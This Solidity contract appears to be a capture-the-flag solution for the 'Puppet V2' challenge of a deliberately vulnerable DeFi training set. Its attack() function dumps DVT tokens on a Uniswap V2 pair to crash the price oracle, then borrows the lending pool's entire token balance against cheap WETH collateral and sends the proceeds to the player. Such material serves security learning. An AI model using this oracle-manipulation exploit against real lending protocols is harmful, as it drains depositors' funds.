// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IUniswapV2Router {
    function WETH() external pure returns (address);

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

interface IPool {
    function borrow(uint256 amount) external;

    function calculateDepositOfWETHRequired(uint256 tokenAmount) external view returns (uint256);
}

interface IWETH is IERC20 {
    function deposit() external payable;
}

contract AttackerPuppetV2 {
    IPool private immutable pool;
    IUniswapV2Router private immutable router;

    IERC20 private immutable token;
    IWETH private immutable weth;

    address private immutable player;

    uint256 private poolInitialBalance;
    uint256 private playerInitialBalance;

    constructor(
        address _pool,
        address _router,
        address _token,
        address _player,
        uint256 _poolInitialBalance,
        uint256 _playerInitialBalance
    ) {
        pool = IPool(_pool);
        router = IUniswapV2Router(_router);

        token = IERC20(_token);
        weth = IWETH(router.WETH());

        player = _player;

        poolInitialBalance = _poolInitialBalance;
        playerInitialBalance = _playerInitialBalance;
    }

    function attack() external payable {
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);

        // 1. Swap DVT for WETH
        token.approve(address(router), playerInitialBalance);
        router.swapExactTokensForTokens(playerInitialBalance, 9 ether, path, address(this), block.timestamp);

        // 2. Convert ETH to WETH
        weth.deposit{ value: address(this).balance }();

        // 3. Approve and borrow now worthless DVT
        weth.approve(address(pool), weth.balanceOf(address(this)));
        pool.borrow(poolInitialBalance);

        // 4. Transfer out DVT to the player
        token.transfer(player, token.balanceOf(address(this)));
        weth.transfer(player, weth.balanceOf(address(this)));
    }

    receive() external payable {}
}
